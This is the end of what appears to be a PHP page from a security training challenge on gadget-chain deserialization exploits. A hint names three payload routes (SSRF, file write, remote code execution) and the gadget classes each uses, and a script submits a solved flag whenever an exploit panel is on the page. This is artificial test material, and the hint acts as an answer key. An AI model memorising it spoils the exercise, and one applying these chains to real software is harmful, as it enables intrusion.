        <div class="hint-text">Use the simulated header form with ANY of the three exploit payloads. The SSRF payload
          replaces RuleChecker with SSRFFetcher (4 levels). The FileWrite payload replaces ConfigParser with
          FileWriterGadget (5 levels). The RCE payload replaces DataSerializer with CommandExecutorGadget (5 levels).
          All achieve full exploitation!</div>
      </div>
    <?php endif; ?>

    <div class="attempts-bar"><i class="fas fa-crosshairs"></i><span>Attempts:
        <strong><?php echo $attempts; ?></strong></span></div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      // Check if deep chain exploitation was detected
      const exploitPanel = document.querySelector('.chain-exploit-panel');
      if (exploitPanel && !document.querySelector('.solved-banner')) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>